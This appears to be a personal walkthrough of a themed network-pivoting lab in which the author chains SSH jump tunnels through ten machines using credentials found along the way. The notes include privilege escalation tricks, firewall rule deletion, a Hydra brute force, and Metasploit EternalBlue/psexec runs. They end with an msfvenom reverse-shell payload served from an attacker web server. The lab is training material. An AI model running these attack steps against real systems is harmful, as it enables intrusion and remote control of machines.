# Dante and the Nine Tunnels of Hell

## Walkthrough

### Initial Access to Limbo
##### ping scan on the 192.168.1.1 network
```
nmap -sn 192.168.1.1/24
```
![Pasted image 20250529083614](../zzAttachments/Pasted%20image%2020250529083614.png)
##### Nmap scan for 192.168.1.200
```
nmap -A 192.168.1.200
```
![Pasted image 20250529085110](../zzAttachments/Pasted%20image%2020250529085110.png)
##### Banner grab ssh
```
telnet 192.168.1.200 22
```
![Pasted image 20250529085153](../zzAttachments/Pasted%20image%2020250529085153.png)
##### ssh attempt
```
ssh 192.168.1.200
```
![Pasted image 20250529085258](../zzAttachments/Pasted%20image%2020250529085258.png)

#### Credentials Discovered
```
virgil:ignorance
```

##### ssh login
```
ssh virgil@192.168.1.200
```

### Limbo
- IP - 192.168.1.200
##### Sudo privileges
```
sudo -l
```
![Pasted image 20250604110947](../zzAttachments/Pasted%20image%2020250604110947.png)
##### Interesting documents
```
cat /home/virgil/things/welcome.txt
```
![Pasted image 20250604111118](../zzAttachments/Pasted%20image%2020250604111118.png)
```
cleopatra@172.1.98.15
Cerberus@10.1.10.3 #why is this C capitalized?
pluto@10.0.0.254
phlegyas@255.255.255.9
epicurus@9.9.9.8
minotaur@222.222.222.187
geryon@3.3.3.3
satan@6.6.6.6
??@72.69.76.?
```
##### Attempt ssh as cleopatra
```
ssh cleopatra@172.1.98.15
```
![Pasted image 20250604111927](../zzAttachments/Pasted%20image%2020250604111927.png)
### Lust
- IP - 172.1.98.15
##### if /etc/proxychains.conf doesnt exist
```
cp /etc/proxychains4.conf /etc/proxychains.conf
```
##### Dynamic port forwarding for nmap scan; strict_chain
```
nano /etc/proxychains.conf
```
```
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 1080
```
#### Dynamic tunnel on kali
```
ssh -N -D 1080 virgil@192.168.1.200
```
##### nmap scan
- MUST USE SUDO FOR PROXYCHAINS WITH NMAP
```
sudo proxychains nmap -sT -Pn 172.1.98.15
```
![Pasted image 20250529135656](../zzAttachments/Pasted%20image%2020250529135656.png)
##### Test port 21 anonymous access
- anonymous login not allowed
```
proxychains nc 172.1.98.15
```
![Pasted image 20250604113330](../zzAttachments/Pasted%20image%2020250604113330.png)

##### Testing port 22
![Pasted image 20250604113529](../zzAttachments/Pasted%20image%2020250604113529.png)
##### Connect to port 80
```
proxychains telnet 172.1.98.15 80
```
![Pasted image 20250604112513](../zzAttachments/Pasted%20image%2020250604112513.png)
```
proxychains nc 172.1.98.15 80
```
![Pasted image 20250604112615](../zzAttachments/Pasted%20image%2020250604112615.png)
```
proxychains firefox http://172.1.98.15:80
```
![Pasted image 20250604112542](../zzAttachments/Pasted%20image%2020250604112542.png)

or
#### Forwarding port to "Lust"
```
ssh -N -L 333:172.1.98.15:80 virgil@192.168.1.200
```
```
firefox 127.0.0.1:333
```
![Pasted image 20250604112916](../zzAttachments/Pasted%20image%2020250604112916.png)

#### Credentials Discovered
```
cleopatra:desire
```

##### Testing ftp with credentials
- credentials work but ftp isn't configured

![Pasted image 20250604113758](../zzAttachments/Pasted%20image%2020250604113758.png)

##### Testing ssh with credentials
```
proxychains ssh cleopatra@172.1.98.15
```
![Pasted image 20250604114051](../zzAttachments/Pasted%20image%2020250604114051.png)

##### Sudo privileges
```
sudo -l
```
![Pasted image 20250604114119](../zzAttachments/Pasted%20image%2020250604114119.png)

##### Network Configuration
![Pasted image 20250604114347](../zzAttachments/Pasted%20image%2020250604114347.png)
- referring back to "welcome.txt" file from "Limbo" this tracks to have our next target being Cerberus@10.1.10.3
```
cleopatra@172.1.98.15
Cerberus@10.1.10.3 #why is this C capitalized?
pluto@10.0.0.254
phlegyas@255.255.255.9
epicurus@9.9.9.8
minotaur@222.222.222.187
geryon@3.3.3.3
satan@6.6.6.6
??@72.69.76.?
```

### Gluttony
- IP - 10.1.10.3

###### Setup a NEW dynamic tunnel to reach 10.1.10.3
```
ssh -N -D 1080 -j virgil@192.168.1.200 cleopatra@172.1.98.15
```

##### Nmap Scan
```
sudo proxychains nmap -sT -Pn 10.1.10.3
```
![Pasted image 20250604115245](../zzAttachments/Pasted%20image%2020250604115245.png)

##### Checking for Anonymous FTP 
```
proxychains ftp 10.1.10.3
```
![Pasted image 20250604115416](../zzAttachments/Pasted%20image%2020250604115416.png)
##### less clue.txt
```
HA
```

##### less gluttony.log
```
ssh Cerberus@10.1.10.
excess
^C
^C
history -C
ssh Cerberus@10.1.10.3
ssh cerberus@10.1.10.3
unsetHISTFILE
exit
```

##### less shadow.bak
```
pluto:mammon
```

##### less ssh_jump.txt
```
ssh -L 4445:72.69.76.2:445 -J virgil@192.168.1.200:22,cleopatra@172.1.98.15:22,cerberus@10.1.10.3:22,pluto@10.0.0.254:22,phlegyas@255.255.255.9:22,epicurus@9.9.9.8:22,minotaur@222.222.222.187:22,
geryon@3.3.3.3:22 satan@6.6.6.6 -p 22
```

#### Credentials Discovered
```
Cerberus:excess
pluto:mammon
```

##### ssh to 10.1.10.3
```
proxychains ssh cerberus@10.1.10.3
```

##### Check sudo permissions
![Pasted image 20250604141839](../zzAttachments/Pasted%20image%2020250604141839.png)

### Greed
- IP - 10.0.0.254

###### Setup a NEW dynamic tunnel to reach 10.0.0.254
```
ssh -N -D 1080 -J virgil@192.168.1.200,cleopatra@172.1.98.15 cerberus@10.1.10.3
```

##### ssh to 10.0.0.254
```
proxychains ssh pluto@10.0.0.254
```
##### cat greed.txt
```
Only I can access the treasure.
```
![Pasted image 20250531203502](../zzAttachments/Pasted%20image%2020250531203502.png)
##### Try sudo
![Pasted image 20250531203614](../zzAttachments/Pasted%20image%2020250531203614.png)
##### Try ssh to next hop
```
ssh phlegyas@255.255.255.9
```
![Pasted image 20250531203422](../zzAttachments/Pasted%20image%2020250531203422.png)

##### iptables
![Pasted image 20250531203727](../zzAttachments/Pasted%20image%2020250531203727.png)
##### nftables
```
nft list ruleset
```
![Pasted image 20250531203812](../zzAttachments/Pasted%20image%2020250531203812.png)

##### SUID bits set
```
find / -type f -perm -4000 2>/dev/null
```
![Pasted image 20250531204550](../zzAttachments/Pasted%20image%2020250531204550.png)
##### escalate
```
/opt/greed/.gold
```
![Pasted image 20250531204716](../zzAttachments/Pasted%20image%2020250531204716.png)

##### nftables
```
nft list ruleset
```
![Pasted image 20250531204912](../zzAttachments/Pasted%20image%2020250531204912.png)
##### Remove the rule
```
sudo nft delete rule ip filter output tcp dport 22 reject
```
![Pasted image 20250531205357](../zzAttachments/Pasted%20image%2020250531205357.png)
	no handle is set so the rule cannot be deleted this way
```
nft flush chain ip filter output
```
![Pasted image 20250531210311](../zzAttachments/Pasted%20image%2020250531210311.png)

### Anger
- IP - 255.255.255.9
###### Setup a NEW dynamic tunnel to reach 255.255.255.9
```
ssh -N -D 1080 -J virgil@192.168.1.200,cleopatra@172.1.98.15,cerberus@10.1.10.3 pluto@10.0.0.254
```
![Pasted image 20250604154006](../zzAttachments/Pasted%20image%2020250604154006.png)
##### nmap 255.255.255.9
```
sudo proxychains nmap -sT -Pn -n 255.255.255.9
```
![Pasted image 20250601010824](../zzAttachments/Pasted%20image%2020250601010824.png)

##### Port Enumeration
```
nc/telnet [IP] [PORT]
```

or

```
for port in 21 22 23 25 79 80 443 5900 8080; do
  echo "Banner on port $port:"
  proxychains nc -w 3 255.255.255.9 $port
  echo
done
```
![Pasted image 20250601011359](../zzAttachments/Pasted%20image%2020250601011359.png)

or

```
for port in 21 22 23 25 79 80 443 5900 8080; do
  echo "Banner on port $port:"
  proxychains -q nc -w 3 255.255.255.9 $port 2>/dev/null | grep -vE 'proxychains|DLL init|Strict chain'
  echo
done
```
![Pasted image 20250604154254](../zzAttachments/Pasted%20image%2020250604154254.png)

##### Hints point towards the last port (65535)
```
proxychains nc 255.255.255.9 65535
```
![Pasted image 20250601011444](../zzAttachments/Pasted%20image%2020250601011444.png)

#### Credentials Discovered
```
wrath
```

##### test ssh credentials
```
proxychains ssh phlegyas@255.255.255.9 
```
![Pasted image 20250604155708](../zzAttachments/Pasted%20image%2020250604155708.png)

##### cat anger.txt
```
EPICURUS AND ALL THE denial
THE MINOTAUR'S MINDLESS fury
GERYON'S HORROR IS THE ULTIMATE deception
disgusting horror torment betrayal malcontent monstrous faces treacherous traitor frozen powerless punishment judas brutus cassius nine treason
```
![Pasted image 20250604155846](../zzAttachments/Pasted%20image%2020250604155846.png)

#### Credentials Discovered
```
epicurus:denial
minotaur:fury
geryon:deception
satan:[disgusting horror torment betrayal malcontent monstrous faces treacherous traitor frozen powerless punishment judas brutus cassius nine treason]
```

### Heresy
- IP - 9.9.9.8

##### Dynamic SSH tunnel
```
ssh -N -D 1080 -J virgil@192.168.1.200,cleopatra@172.1.98.15,cerberus@10.1.10.3,pluto@10.0.0.254 phlegyas@255.255.255.9
```

#### Credentials Known
```
epicurus:denial
```

##### SSH Attempt
```
proxychains ssh epicurus@9.9.9.8
```
![Pasted image 20250604170320](../zzAttachments/Pasted%20image%2020250604170320.png)

##### nmap scan
```
sudo proxychains nmap -sT -Pn -n 9.9.9.8 
```
![Pasted image 20250604175427](../zzAttachments/Pasted%20image%2020250604175427.png)

##### Banner Grab Port 1
```
proxychains telnet 9.9.9.8 1 
```
![Pasted image 20250604175525](../zzAttachments/Pasted%20image%2020250604175525.png)

##### Attempt SSH on Port 1
```
proxychains ssh epicurus@9.9.9.8 -p 1
```
![Pasted image 20250604175653](../zzAttachments/Pasted%20image%2020250604175653.png)

##### check sudo privileges
![Pasted image 20250604175901](../zzAttachments/Pasted%20image%2020250604175901.png)
##### Try ssh to next hop
```
ssh minotaur@222.222.222.187
```
![Pasted image 20250604180004](../zzAttachments/Pasted%20image%2020250604180004.png)
- the "#" would imply root
- @07-violence would imply we're on the remote machine.
#### However
![Pasted image 20250604232401](../zzAttachments/Pasted%20image%2020250604232401.png)
- These commands reveal the machine is 06-heresy
	- the ssh command never left this machine or was redirected back to this machine

##### sudo man man
```
!/bin/bash
```
- While this shows root, its too limited to fix the SSH issues

##### sudo ln
```
sudo ln -fs /bin/sh /bin/ln
```
![Pasted image 20250604232755](../zzAttachments/Pasted%20image%2020250604232755.png)
##### Doesn't show the rule
```
iptables -L -v -n
```
Does show the rule
```
iptables-save
```

##### Delete the rule preventing ssh
```
iptables -t nat -D OUTPUT -p tcp --dport 22 -j DNAT --to-destination 127.0.0.1:1
```
- since the connection is being used it will freeze the terminal and require a new one

##### Re-establish SSH
```
proxychains ssh epicurus@9.9.9.8 -p 1
```

##### Test SSH is working to the next hop
```
ssh minotaur@222.222.222.187
```
![Pasted image 20250604233330](../zzAttachments/Pasted%20image%2020250604233330.png)

##### SSH Disconnects
![Pasted image 20250604234019](../zzAttachments/Pasted%20image%2020250604234019.png)
- The SSH connection on 07-violence appears to die for unknown reasons

### Violence
- IP - 222.222.222.187
##### Create the Dynamic SSH Tunnel
```
ssh -N -D 1080 -J virgil@192.168.1.200,cleopatra@172.1.98.15,cerberus@10.1.10.3,pluto@10.0.0.254,phlegyas@255.255.255.9 epicurus@9.9.9.8 -p 1
```
#### Credentials Known
```
minotaur:fury
```
##### SSH to Violence
```
proxychains ssh minotaur@222.222.222.187
```
![Pasted image 20250604234834](../zzAttachments/Pasted%20image%2020250604234834.png)
##### verify its the real target
![Pasted image 20250604234903](../zzAttachments/Pasted%20image%2020250604234903.png)
##### Check sudo privlidge
```
sudo -i
```
![Pasted image 20250604235017](../zzAttachments/Pasted%20image%2020250604235017.png)
- something, again, kills the ssh connection

##### The Race is On
```
systemctl list-units --type=service --state=running
systemctl list-units --type=service
ss -tulpn
```
- ssh disconets appear to happen in 5th minute intervals which points towards crontab

##### crontab
```
sudo crontab -l
```
![Pasted image 20250604235654](../zzAttachments/Pasted%20image%2020250604235654.png)
```
cat /usr/local/bin/killer.sh
```
![Pasted image 20250604235733](../zzAttachments/Pasted%20image%2020250604235733.png)

##### Remove the crontab entry
```
sudo crontab -e
```

##### Test SSH credentials to next hop
```
ssh geryon@3.3.3.3
```
![Pasted image 20250605000026](../zzAttachments/Pasted%20image%2020250605000026.png)
- appears to give root access to the 10th and final machine "salvation", skipping 08 and 09

### Fraud
- IP - 3.3.3.3
##### Create the Dynamic SSH Tunnel
```
ssh -N -D 1080 -J virgil@192.168.1.200,cleopatra@172.1.98.15,cerberus@10.1.10.3,pluto@10.0.0.254,phlegyas@255.255.255.9,epicurus@9.9.9.8:1 minotaur@222.222.222.187
```

#### Credentials Known
```
geryon:deception
```

##### Connect via SSH
```
proxychains ssh geryon@3.3.3.3
```
![Pasted image 20250605000559](../zzAttachments/Pasted%20image%2020250605000559.png)
- appears to be the wrong machine

##### verify host
```
whoami
hostname
who
id
users
logname
```
![Pasted image 20250605000843](../zzAttachments/Pasted%20image%2020250605000843.png)
- The information appears to be correct based on the commands

##### however
```
ip a
cat /etc/hostname
```
![Pasted image 20250605000949](../zzAttachments/Pasted%20image%2020250605000949.png)
- 08-fraud indeed

##### Why are commands showing incorrect information?
```
which whoami
cat /usr/bin/whoami
```
![Pasted image 20250605001124](../zzAttachments/Pasted%20image%2020250605001124.png)
- binaries have been modified to deliver static information

##### Why is the terminal showing root?
```
cat .bashrc | grep salvation
```
![Pasted image 20250605001302](../zzAttachments/Pasted%20image%2020250605001302.png)

##### whoami Actually?
```
w
```
![Pasted image 20250605001359](../zzAttachments/Pasted%20image%2020250605001359.png)

##### Check sudo privileges
```
sudo -l
```
![Pasted image 20250605001448](../zzAttachments/Pasted%20image%2020250605001448.png)

##### SUID bits set
```
find / -type f -perm -4000 2>/dev/null
```
![Pasted image 20250605001640](../zzAttachments/Pasted%20image%2020250605001640.png)

##### Use vim to add geryon to the sudoers group
```
vim /etc/sudoers
:wq!
sudo -i
```

##### Test ssh to 6.6.6.6
```
ssh satan@6.6.6.6
```
![Pasted image 20250605100200](../zzAttachments/Pasted%20image%2020250605100200.png)

### Treachery
- IP - 6.6.6.6
##### Create the Dynamic Tunnel to 6.6.6.6
```
ssh -N -D 1080 -J virgil@192.168.1.200,cleopatra@172.1.98.15,cerberus@10.1.10.3,pluto@10.0.0.254,phlegyas@255.255.255.9,epicurus@9.9.9.8:1,minotaur@222.222.222.187 geryon@3.3.3.3
```

##### nmap scan
```
sudo proxychains nmap -sT -Pn -n 6.6.6.6
```
![Pasted image 20250605100613](../zzAttachments/Pasted%20image%2020250605100613.png)

##### Banner Grab 666
```
proxychains nc 6.6.6.6 666
```
![Pasted image 20250605100659](../zzAttachments/Pasted%20image%2020250605100659.png)
##### make a password_list.txt for brute force
```
echo "disgusting\nhorror\ntorment\nbetrayal\nmalcontent\nmonstrous\nfaces\ntreacherous\ntraitor\nfrozen\npowerless\npunishmen\njuda\nbrutus\ncassius\nnine\ntreason" > password_list.txt
```

##### Bruteforce SSH login with Hydra
```
proxychains hydra -s 666 -t 4 -V -f -l satan -P password_list.txt ssh://6.6.6.6 
```
![Pasted image 20250601121600](../zzAttachments/Pasted%20image%2020250601121600.png)

##### Login with SSH
```
proxychains ssh satan@6.6.6.6 -p 666
```
![Pasted image 20250605101722](../zzAttachments/Pasted%20image%2020250605101722.png)

##### Test sudo privileges/gain root
```
sudo -l
sudo -i
```
![Pasted image 20250605101930](../zzAttachments/Pasted%20image%2020250605101930.png)

##### Tunnel to Salvation
```
ssh -N -D 1080 -J virgil@192.168.1.200,cleopatra@172.1.98.15,cerberus@10.1.10.3,pluto@10.0.0.254,phlegyas@255.255.255.9,epicurus@9.9.9.8:1,minotaur@222.222.222.187,geryon@3.3.3.3 satan@6.6.6.6 -p 666
```

## Congratulations on making it to Salvation!
- Launch some exploits at which ever salvation VM is in your lab
- Never launch both VMs at the same time 
	- They have the same IP
- Satan has Metasploit installed.
	- Due to tunnel distance some exploits will fail going from kali through tunnel.
	- This is especially true for Win2k8 and eternalblue.

### Salvation (Ubuntu - Metasploitable2)
- 03_10-Salvation (LM2)
- msfadmin:msfadmin
- 72.69.76.2


### Salvation (Win2K8 - Metasploitable3)
- 03_10-Salvation
- adminstrator:vagrant
- 72.69.76.2

#### Tunnels
```
ssh -N -D 1080 -J virgil@192.168.1.200:22,cleopatra@172.1.98.15:22,cerberus@10.1.10.3:22,pluto@10.0.0.254:22,phlegyas@255.255.255.9:22,epicurus@9.9.9.8:22,minotaur@222.222.222.187:22,geryon@3.3.3.3:22 satan@6.6.6.6 -p 666
```
```
ssh -N -L 4445:72.69.76.2:445 -J virgil@192.168.1.200:22,cleopatra@172.1.98.15:22,cerberus@10.1.10.3:22,pluto@10.0.0.254:22,phlegyas@255.255.255.9:22,epicurus@9.9.9.8:22,minotaur@222.222.222.187:22,geryon@3.3.3.3:22 satan@6.6.6.6 -p 666
```
```
ssh -N -o GatewayPorts=yes -J virgil@192.168.1.200:22,cleopatra@172.1.98.15:22,cerberus@10.1.10.3:22,pluto@10.0.0.254:22,phlegyas@255.255.255.9:22,epicurus@9.9.9.8:22,minotaur@222.222.222.187:22,geryon@3.3.3.3:22 \
  satan@6.6.6.6 -p 666 \
  -R 45241:127.0.0.1:45241
```
```
proxychains nmap -sV -sT -Pn -n 72.69.76.2 
```
![Pasted image 20250601125927](../zzAttachments/Pasted%20image%2020250601125927.png)

##### msfconsole
```
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/reverse_tcp
set rhost 127.0.0.1
set rport 4445
set lhost 72.69.76.76
set lport 45241
```
![Pasted image 20250601130825](../zzAttachments/Pasted%20image%2020250601130825.png)
```
run
```
It will most likely fail and continue to fail due the the amount of hops being made.

```
use windows/smb/psexec
set rhost 127.0.0.1
set rport 4445
set lhost 72.69.76.76
set lport 45241
set smbuser administrator
set smbpass vagrant
```
![Pasted image 20250601135928](../zzAttachments/Pasted%20image%2020250601135928.png)
```
run
```

#### Payload (for bind) (PoC)

##### Generate Payload
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=72.69.76.76 LPORT=45241 -f exe > payload.exe
```

##### Attacker web server
```
python -m http.server 45241
```

## From Windows internet explorer
http://72.69.76.76:45141
download payload .exe

## Persistent Listener
```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 127.0.0.1
set LPORT 45241
set exitonsession false
exploit -j
```